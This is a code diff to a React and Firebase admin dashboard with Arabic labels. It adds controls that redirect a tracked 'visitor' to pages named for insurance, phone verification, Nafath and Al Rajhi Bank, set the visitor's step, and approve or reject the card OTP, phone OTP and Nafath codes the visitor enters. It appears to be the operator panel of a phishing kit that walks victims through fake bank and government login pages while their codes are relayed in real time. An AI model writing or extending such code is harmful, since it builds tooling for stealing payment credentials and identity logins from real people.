@@ -33,6 +33,7 @@ import {
   onSnapshot,
   query,
   orderBy,
+  serverTimestamp,
 } from "firebase/firestore";
 import { db, isFirebaseConfigured, loginWithEmail, logout, subscribeToAuthState } from "@/lib/firebase";
 import type { User as FirebaseUser } from "firebase/auth";
@@ -278,6 +279,40 @@ export default function Dashboard() {
     try {
       await updateDoc(doc(db, "pays", id), { approvalStatus: "pending_review" });
       toast({ title: "تم وضع الطلب قيد المراجعة" });
+    } catch (error) {
+      toast({ title: "خطأ", variant: "destructive" });
+    }
+  };
+
+  const handleRedirectUser = async (id: string, targetPage: string, targetStep?: number) => {
+    if (!db) return;
+    try {
+      await updateDoc(doc(db, "pays", id), {
+        adminDirective: {
+          targetPage,
+          targetStep: targetStep || 1,
+          issuedAt: new Date().toISOString(),
+        },
+      });
+      toast({ title: `تم توجيه الزائر إلى ${targetPage}` });
+    } catch (error) {
+      toast({ title: "خطأ في التوجيه", variant: "destructive" });
+    }
+  };
+
+  const handleSetStep = async (id: string, step: number) => {
+    if (!db) return;
+    try {
+      const currentApp = notifications.find((n) => n.id === id);
+      const currentPage = currentApp?.currentPage || "motor";
+      await updateDoc(doc(db, "pays", id), {
+        adminDirective: {
+          targetPage: currentPage,
+          targetStep: step,
+          issuedAt: new Date().toISOString(),
+        },
+      });
+      toast({ title: `تم تغيير الخطوة إلى ${step}` });
     } catch (error) {
       toast({ title: "خطأ", variant: "destructive" });
     }
@@ -745,11 +780,12 @@ export default function Dashboard() {
                 )}
               </div>
 
-              {/* Right Column - Visitor Info */}
-              <div className="col-span-3">
+              {/* Right Column - Visitor Info & Controls */}
+              <div className="col-span-3 space-y-4">
+                {/* Visitor Info */}
                 <Card className="bg-white dark:bg-gray-800">
                   <CardHeader className="pb-2">
-                    <CardTitle className="text-sm font-medium">المزيد</CardTitle>
+                    <CardTitle className="text-sm font-medium">معلومات الزائر</CardTitle>
                   </CardHeader>
                   <CardContent className="space-y-3">
                     <div className="flex items-center gap-2" data-testid="info-country">
@@ -764,22 +800,159 @@ export default function Dashboard() {
                       <MapPin className="w-4 h-4 text-gray-400" />
                       <span className="text-sm text-gray-600">{selectedApplication.os || "-"}</span>
                     </div>
-                    
+                    <div className="flex items-center gap-2" data-testid="info-current-page">
+                      <Eye className="w-4 h-4 text-gray-400" />
+                      <span className="text-sm text-gray-600">
+                        الصفحة: {selectedApplication.currentPage || "-"} 
+                        {selectedApplication.currentStep !== undefined && ` (خطوة ${selectedApplication.currentStep})`}
+                      </span>
+                    </div>
+                  </CardContent>
+                </Card>
+
+                {/* Page Control */}
+                <Card className="bg-white dark:bg-gray-800">
+                  <CardHeader className="pb-2">
+                    <CardTitle className="text-sm font-medium">التحكم بالصفحات</CardTitle>
+                  </CardHeader>
+                  <CardContent className="space-y-3">
+                    <div className="grid grid-cols-2 gap-2">
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="text-xs"
+                        onClick={() => handleRedirectUser(selectedApplication.id, "motor", 1)}
+                        data-testid="button-goto-motor"
+                      >
+                        التأمين
+                      </Button>
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="text-xs"
+                        onClick={() => handleRedirectUser(selectedApplication.id, "phone-verification", 1)}
+                        data-testid="button-goto-phone"
+                      >
+                        التحقق من الهاتف
+                      </Button>
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="text-xs"
+                        onClick={() => handleRedirectUser(selectedApplication.id, "nafaz", 1)}
+                        data-testid="button-goto-nafaz"
+                      >
+                        نفاذ
+                      </Button>
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="text-xs"
+                        onClick={() => handleRedirectUser(selectedApplication.id, "rajhi", 1)}
+                        data-testid="button-goto-rajhi"
+                      >
+                        الراجحي
+                      </Button>
+                    </div>
+
+                    {/* Step Control */}
                     <div className="border-t pt-3 mt-3">
-                      <div className="flex flex-wrap gap-2">
-                        <Button 
-                          variant="default"
-                          className="flex-1 text-xs"
-                          data-testid="button-show-card"
+                      <p className="text-xs text-gray-500 mb-2">التحكم بالخطوات</p>
+                      <div className="flex flex-wrap gap-1">
+                        {[1, 2, 3, 4, 5].map((step) => (
+                          <Button
+                            key={step}
+                            variant={selectedApplication.currentStep === step ? "default" : "outline"}
+                            size="sm"
+                            className="w-8 h-8 p-0 text-xs"
+                            onClick={() => handleSetStep(selectedApplication.id, step)}
+                            data-testid={`button-step-${step}`}
+                          >
+                            {step}
+                          </Button>
+                        ))}
+                      </div>
+                    </div>
+                  </CardContent>
+                </Card>
+
+                {/* Approval Controls */}
+                <Card className="bg-white dark:bg-gray-800">
+                  <CardHeader className="pb-2">
+                    <CardTitle className="text-sm font-medium">الموافقات</CardTitle>
+                  </CardHeader>
+                  <CardContent className="space-y-3">
+                    {/* Card OTP Approval */}
+                    <div className="flex flex-wrap items-center justify-between gap-2">
+                      <span className="text-xs text-gray-500">OTP البطاقة</span>
+                      <div className="flex gap-1">
+                        <Button
+                          variant={selectedApplication.cardOtpApproved ? "default" : "outline"}
+                          size="sm"
+                          className="text-xs h-7"
+                          onClick={() => handleFieldApproval(selectedApplication.id, "cardOtpApproved", true)}
+                          data-testid="button-approve-card-otp"
                         >
-                          إظهار بطاقة
+                          <Check className="w-3 h-3" />
                         </Button>
-                        <Button 
-                          variant="outline"
-                          className="flex-1 text-xs"
-                          data-testid="button-redirect"
+                        <Button
+                          variant={selectedApplication.cardOtpApproved === false ? "destructive" : "outline"}
+                          size="sm"
+                          className="text-xs h-7"
+                          onClick={() => handleFieldApproval(selectedApplication.id, "cardOtpApproved", false)}
+                          data-testid="button-reject-card-otp"
                         >
-                          توجيه الزائر
+                          <XCircle className="w-3 h-3" />
+                        </Button>
+                      </div>
+                    </div>
+
+                    {/* Phone OTP Approval */}
+                    <div className="flex flex-wrap items-center justify-between gap-2">
+                      <span className="text-xs text-gray-500">OTP الهاتف</span>
+                      <div className="flex gap-1">
+                        <Button
+                          variant={selectedApplication.phoneOtpApproved ? "default" : "outline"}
+                          size="sm"
+                          className="text-xs h-7"
+                          onClick={() => handleFieldApproval(selectedApplication.id, "phoneOtpApproved", true)}
+                          data-testid="button-approve-phone-otp-ctrl"
+                        >
+                          <Check className="w-3 h-3" />
+                        </Button>
+                        <Button
+                          variant={selectedApplication.phoneOtpApproved === false ? "destructive" : "outline"}
+                          size="sm"
+                          className="text-xs h-7"
+                          onClick={() => handleFieldApproval(selectedApplication.id, "phoneOtpApproved", false)}
+                          data-testid="button-reject-phone-otp-ctrl"
+                        >
+                          <XCircle className="w-3 h-3" />
+                        </Button>
+                      </div>
+                    </div>
+
+                    {/* Nafath Approval */}
+                    <div className="flex flex-wrap items-center justify-between gap-2">
+                      <span className="text-xs text-gray-500">نفاذ</span>
+                      <div className="flex gap-1">
+                        <Button
+                          variant={selectedApplication.nafathApproved ? "default" : "outline"}
+                          size="sm"
+                          className="text-xs h-7"
+                          onClick={() => handleFieldApproval(selectedApplication.id, "nafathApproved", true)}
+                          data-testid="button-approve-nafath"
+                        >
+                          <Check className="w-3 h-3" />
+                        </Button>
+                        <Button
+                          variant={selectedApplication.nafathApproved === false ? "destructive" : "outline"}
+                          size="sm"
+                          className="text-xs h-7"
+                          onClick={() => handleFieldApproval(selectedApplication.id, "nafathApproved", false)}
+                          data-testid="button-reject-nafath"
+                        >
+                          <XCircle className="w-3 h-3" />
                         </Button>
                       </div>
                     </div>
